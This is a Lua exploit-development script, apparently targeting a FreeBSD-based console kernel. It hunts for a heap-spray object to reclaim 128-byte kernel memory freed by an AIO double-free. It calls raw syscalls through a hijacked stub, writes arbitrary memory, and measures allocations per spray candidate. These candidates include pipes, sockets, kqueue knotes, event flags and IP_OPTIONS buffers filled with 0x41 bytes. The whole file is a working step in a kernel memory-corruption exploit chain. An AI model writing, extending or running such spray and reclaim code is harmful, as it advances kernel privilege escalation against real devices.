-- CRASH_CLASS: LOW
-- PROBE 94a: Spray vehicle hunt for 128B zone reclaim
--
-- The AIO double-free (65l) frees entries in the 128B kmemzones bucket.
-- IPv6 ext-header spray is DEAD (74a). EVF doesn't cross zones (77g).
-- We need a different 128B allocation we can:
--   1. Create many of (spray)
--   2. Control content of (at least partially)
--   3. Read back or detect overlap
--
-- Candidates to measure with 624 oracle:
--   - pipe creation (struct pipe ~120B on FreeBSD 11?)
--   - socket creation internals
--   - kqueue knote allocation (per-event)
--   - SO_LINGER struct
--   - TCP_FUNCTION_BLK
--   - unix socket peer credential attachment
--   - accept() on listening socket
--   - semaphore (ksem) via _ksem_open(405)
--   - AIO itself (same-type, but with controlled fields)

print("=== PROBE 94a: SPRAY VEHICLE HUNT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- 624 oracle: returns VM op counter
local sc624 = mk(624)
local function oracle()
    local ok, rv = pcall(function() return sc624(uint64(0), uint64(0), uint64(0)) end)
    return ok and N(rv) or -1
end

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local sp = memory.alloc(8)
local sv = memory.alloc(4)

-- ============================
-- [A] Pipe creation: measure kernel allocs per pipe()
-- ============================
print("[A] PIPE CREATION")
local pre_a = oracle()
local pipe_fds = {}
for i = 1, 50 do
    wd(N(sp), 0); wd(N(sp)+4, 0)
    local ok, rv = pcall(function() return mk(42)(sp) end)
    if ok and sgn(rv) == 0 then
        pipe_fds[#pipe_fds + 1] = {rd(N(sp)), rd(N(sp)+4)}
    end
end
local post_a = oracle()
print(string.format("  50 pipes: delta=%d (%.1f per pipe)", post_a - pre_a, (post_a - pre_a)/50))
-- Cleanup
for i = 1, #pipe_fds do
    pcall(function() mk(6)(uint64(pipe_fds[i][1])) end)
    pcall(function() mk(6)(uint64(pipe_fds[i][2])) end)
end

-- ============================
-- [B] Socket creation: measure per socket()
-- ============================
print("")
print("[B] SOCKET CREATION (AF_INET DGRAM)")
local pre_b = oracle()
local sock_fds = {}
for i = 1, 50 do
    local ok, rv = pcall(function() return mk(97)(uint64(2), uint64(2), uint64(0)) end)
    if ok then
        local fd = sgn(rv)
        if fd >= 0 then sock_fds[#sock_fds + 1] = fd end
    end
end
local post_b = oracle()
print(string.format("  50 UDP sockets: created=%d delta=%d (%.1f per sock)",
    #sock_fds, post_b - pre_b, #sock_fds > 0 and (post_b - pre_b)/#sock_fds or 0))
for i = 1, #sock_fds do pcall(function() mk(6)(uint64(sock_fds[i])) end) end

-- ============================
-- [C] Socketpair creation
-- ============================
print("")
print("[C] SOCKETPAIR CREATION (AF_UNIX DGRAM)")
local pre_c = oracle()
local spair_fds = {}
for i = 1, 50 do
    wd(N(sp), 0); wd(N(sp)+4, 0)
    local ok, rv = pcall(function() return mk(135)(uint64(1), uint64(2), uint64(0), sp) end)
    if ok and sgn(rv) == 0 then
        spair_fds[#spair_fds + 1] = {rd(N(sp)), rd(N(sp)+4)}
    end
end
local post_c = oracle()
print(string.format("  50 socketpairs: created=%d delta=%d (%.1f per pair)",
    #spair_fds, post_c - pre_c, #spair_fds > 0 and (post_c - pre_c)/#spair_fds or 0))
for i = 1, #spair_fds do
    pcall(function() mk(6)(uint64(spair_fds[i][1])) end)
    pcall(function() mk(6)(uint64(spair_fds[i][2])) end)
end

-- ============================
-- [D] Kqueue creation
-- ============================
print("")
print("[D] KQUEUE CREATION")
local pre_d = oracle()
local kq_fds = {}
for i = 1, 50 do
    local ok, rv = pcall(function() return mk(362)() end)
    if ok then
        local fd = sgn(rv)
        if fd >= 0 then kq_fds[#kq_fds + 1] = fd end
    end
end
local post_d = oracle()
print(string.format("  50 kqueues: created=%d delta=%d (%.1f per kq)",
    #kq_fds, post_d - pre_d, #kq_fds > 0 and (post_d - pre_d)/#kq_fds or 0))
for i = 1, #kq_fds do pcall(function() mk(6)(uint64(kq_fds[i])) end) end

-- ============================
-- [E] SHM creation
-- ============================
print("")
print("[E] SHM_OPEN CREATION")
local pre_e = oracle()
local shm_fds = {}
for i = 1, 50 do
    -- SHM_ANON = use path (char*)1 on FreeBSD
    local ok, rv = pcall(function()
        return mk(482)(uint64(1), uint64(0x202), uint64(0x1B6)) -- O_CREAT|O_RDWR, 0666
    end)
    if ok then
        local fd = sgn(rv)
        if fd >= 0 then shm_fds[#shm_fds + 1] = fd end
    end
end
local post_e = oracle()
print(string.format("  50 shm: created=%d delta=%d (%.1f per shm)",
    #shm_fds, post_e - pre_e, #shm_fds > 0 and (post_e - pre_e)/#shm_fds or 0))
for i = 1, #shm_fds do pcall(function() mk(6)(uint64(shm_fds[i])) end) end

-- ============================
-- [F] Kevent knote registration (EVFILT_TIMER per kqueue)
-- ============================
print("")
print("[F] KEVENT KNOTE (EVFILT_TIMER)")
local kq = sgn(mk(362)())
if kq >= 0 then
    local kev = memory.alloc(0x20) -- struct kevent
    local pre_f = oracle()
    for i = 1, 50 do
        -- struct kevent: ident(8), filter(2), flags(2), fflags(4), data(8), udata(8)
        wq(N(kev), uint64(1000 + i))      -- ident
        wd(N(kev) + 8, 0xFFF9 + 0x10000)  -- filter=-7 (EVFILT_TIMER) + flags=EV_ADD(1)
        -- Actually: filter is at +8 (short), flags at +10 (unsigned short)
        -- Let me be more careful with the layout
        -- FreeBSD amd64 struct kevent:
        --   +0x00: uintptr_t ident (8 bytes)
        --   +0x08: short filter (2 bytes)
        --   +0x0A: unsigned short flags (2 bytes)
        --   +0x0C: unsigned int fflags (4 bytes)
        --   +0x10: intptr_t data (8 bytes)
        --   +0x18: void *udata (8 bytes)
        wq(N(kev), uint64(1000 + i))
        -- filter = -7 (EVFILT_TIMER) = 0xFFF9 as unsigned short
        -- flags = EV_ADD(0x01) | EV_ONESHOT(0x10)
        wd(N(kev) + 8, 0x0011FFF9) -- filter=-7, flags=EV_ADD|EV_ONESHOT
        wd(N(kev) + 0x0C, 0)       -- fflags
        wq(N(kev) + 0x10, uint64(60000)) -- data = 60000ms (1 min, won't fire)
        wq(N(kev) + 0x18, uint64(0))     -- udata

        pcall(function()
            mk(363)(uint64(kq), uint64(N(kev)), uint64(1), uint64(0), uint64(0), uint64(0))
        end)
    end
    local post_f = oracle()
    print(string.format("  50 knotes: delta=%d (%.1f per knote)", post_f - pre_f, (post_f - pre_f)/50))
    pcall(function() mk(6)(uint64(kq)) end)
else
    print("  kqueue create failed")
end

-- ============================
-- [G] Named EVF creation (we know these work)
-- ============================
print("")
print("[G] NAMED EVF CREATION")
local pre_g = oracle()
local evf_handles = {}
for i = 1, 50 do
    local name = put_str(string.format("v%04d", i))
    local ok, rv = pcall(function()
        return mk(538)(uint64(N(name)), uint64(0x120), uint64(0xBEEF0000 + i))
    end)
    if ok then
        local h = sgn(rv)
        if h >= 0 then evf_handles[#evf_handles + 1] = h end
    end
end
local post_g = oracle()
print(string.format("  50 EVFs: created=%d delta=%d (%.1f per evf)",
    #evf_handles, post_g - pre_g, #evf_handles > 0 and (post_g - pre_g)/#evf_handles or 0))
for i = 1, #evf_handles do pcall(function() mk(539)(uint64(evf_handles[i])) end) end

-- ============================
-- [H] Namedobj creation
-- ============================
print("")
print("[H] NAMEDOBJ CREATION")
local pre_h = oracle()
local nobj_handles = {}
for i = 1, 50 do
    local name = put_str(string.format("n%04d", i))
    local ok, rv = pcall(function()
        return mk(557)(uint64(N(name)), uint64(0))
    end)
    if ok then
        local h = sgn(rv)
        if h >= 0 then nobj_handles[#nobj_handles + 1] = h end
    end
end
local post_h = oracle()
print(string.format("  50 namedobjs: created=%d delta=%d (%.1f per nobj)",
    #nobj_handles, post_h - pre_h, #nobj_handles > 0 and (post_h - pre_h)/#nobj_handles or 0))
for i = 1, #nobj_handles do pcall(function() mk(558)(uint64(nobj_handles[i])) end) end

-- ============================
-- [I] Listen + accept (creates new socket struct from template)
-- ============================
print("")
print("[I] ACCEPT ON LISTENING SOCKET")
local lsock = sgn(mk(97)(uint64(2), uint64(1), uint64(0))) -- AF_INET, SOCK_STREAM
if lsock >= 0 then
    local sa_bind = memory.alloc(16)
    wd(N(sa_bind), 0x0002) -- AF_INET
    wd(N(sa_bind) + 2, 0x3412) -- port 0x1234 = 4660
    wd(N(sa_bind) + 4, 0)      -- INADDR_ANY
    local br = sgn(mk(104)(uint64(lsock), uint64(N(sa_bind)), uint64(16)))
    local lr = sgn(mk(106)(uint64(lsock), uint64(5)))
    print(string.format("  bind=%d listen=%d", br, lr))
    pcall(function() mk(6)(uint64(lsock)) end)
else
    print("  listen socket failed: " .. lsock)
end

-- ============================
-- [J] setsockopt IP_OPTIONS (known small alloc)
-- ============================
print("")
print("[J] IP_OPTIONS SPRAY")
local pre_j = oracle()
local opt_socks = {}
local optbuf = memory.alloc(40)
for i = 0, 36, 4 do wd(N(optbuf) + i, 0x41414141) end
for i = 1, 50 do
    local fd = sgn(mk(97)(uint64(2), uint64(2), uint64(0)))
    if fd >= 0 then
        pcall(function()
            mk(105)(uint64(fd), uint64(0), uint64(1), optbuf, uint64(40)) -- IPPROTO_IP=0, IP_OPTIONS=1
        end)
        opt_socks[#opt_socks + 1] = fd
    end
end
local post_j = oracle()
print(string.format("  50 IP_OPTIONS: delta=%d (%.1f per opt)",
    post_j - pre_j, #opt_socks > 0 and (post_j - pre_j)/#opt_socks or 0))
-- Readback test
if #opt_socks > 0 then
    local rbuf = memory.alloc(64)
    local rlen = memory.alloc(4)
    for i = 0, 60, 4 do wd(N(rbuf) + i, 0) end
    wd(N(rlen), 64)
    pcall(function()
        mk(118)(uint64(opt_socks[1]), uint64(0), uint64(1), rbuf, rlen)
    end)
    local got_len = rd(N(rlen)) or 0
    local got_val = rd(N(rbuf)) or 0
    print(string.format("  readback: len=%d val=0x%08X", got_len, got_val))
end
for i = 1, #opt_socks do pcall(function() mk(6)(uint64(opt_socks[i])) end) end

-- Summary
print("")
print(string.format("alive=%s", alive() and "Y" or "N"))
print("=== 94a COMPLETE ===")
